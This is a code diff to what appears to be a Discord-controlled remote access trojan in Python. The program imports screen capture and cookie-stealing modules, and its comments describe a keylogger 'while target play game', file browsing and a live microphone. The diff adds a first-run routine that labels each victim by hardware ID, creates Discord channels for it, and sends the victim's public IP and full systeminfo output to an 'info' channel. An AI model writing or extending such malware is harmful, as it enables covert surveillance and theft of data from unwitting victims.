@@ -5,6 +5,7 @@ import os
 import sys
 from PIL import ImageGrab
 from pathlib import Path
+from urllib.request import urlopen
 from filesplit.split import Split
 from filesplit.merge import Merge
 from itertools import islice
@@ -39,7 +40,6 @@ from resources.get_cookies import *
 ###############################################################################
 
 
-
 # ----------- Begin of config ---------- #
 # - Please check out README.md before  - #     ! It is recommended to use compiler.py for building executable !
 # -   you change following settings    - #       (following settings will be configured directly in compiler.py)
@@ -50,6 +50,7 @@ software_directory_name = software_registry_name   # ---------------------------
 software_executable_name = software_registry_name.replace(' ', '') + '.exe'   # --- Software executable name
 
 channel_ids = {
+    'info': 0,  # Paste here info channel ID for victim information
     'main': 0,   # Paste here main channel ID for general output
     'spam': 0,   # Paste here spam channel ID for filter key spamming (mostly while target play game)
     'file': 0,   # Paste here file-related channel ID for browsing, downloading and uploading files
@@ -58,6 +59,7 @@ channel_ids = {
 }
 
 secret_key = ''   # Don't touch this line (just leave)
+guild_id = 0
 
 # -            End of config           - #
 # - Don't change anything below unless - #
@@ -87,6 +89,39 @@ if sys.argv[0].lower() != 'c:\\users\\' + getuser() + '\\' + software_directory_
 @client.event
 async def on_ready():
     global force_to_send, messages_to_send, files_to_send, embeds_to_send, channel_ids, cookies_thread
+    if [channel_ids['info'], channel_ids['main'], channel_ids['spam'], channel_ids['file'], channel_ids['recordings'], channel_ids['voice']] == [None, None, None, None, None, None]:
+        hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
+        first_run = True
+        for category_name in client.get_guild(guild_id).categories:
+            if hwid in str(category_name):
+                first_run, category = False, category_name
+                break
+
+        if first_run:
+            category = await client.get_guild(guild_id).create_category(hwid)
+            temp = await client.get_guild(guild_id).create_text_channel('info', category=category); channel_ids['info'] = temp.id
+            temp = await client.get_guild(guild_id).create_text_channel('main', category=category); channel_ids['main'] = temp.id
+            temp = await client.get_guild(guild_id).create_text_channel('spam', category=category); channel_ids['spam'] = temp.id
+            temp = await client.get_guild(guild_id).create_text_channel('recordings', category=category); channel_ids['recordings'] = temp.id
+            temp = await client.get_guild(guild_id).create_text_channel('file', category=category); channel_ids['file'] = temp.id
+            temp = await client.get_guild(guild_id).create_voice_channel('Live microphone', category=category); channel_ids['voice'] = temp.id
+            
+            await client.get_channel(channel_ids['info']).send('```IP address: ' + urlopen('https://ident.me').read().decode('utf-8') + ' [ident.me]```')
+            await client.get_channel(channel_ids['info']).send('```IP address: ' + urlopen('https://ipv4.lafibre.info/ip.php').read().decode('utf-8') + ' [lafibre.info]```')
+            system_info = force_decode(subprocess.run('systeminfo', capture_output= True, shell= True).stdout).strip().replace('\\xff', ' ')
+            chunk = ''
+            for line in system_info.split('\n'):
+                if len(chunk) + len(line) > 1990:
+                    await client.get_channel(channel_ids['info']).send('```' + chunk + '```')
+                    chunk = line + '\n'
+                else:
+                    chunk += line + '\n'
+            await client.get_channel(channel_ids['info']).send('```' + chunk + '```')
+
+
+
+
+
     await client.get_channel(channel_ids['main']).send('||-||\n||-||\n||-||```[' + current_time() + '] New PC session```')
 
     recording_channel_last_message = await discord.utils.get(client.get_channel(channel_ids['recordings']).history())
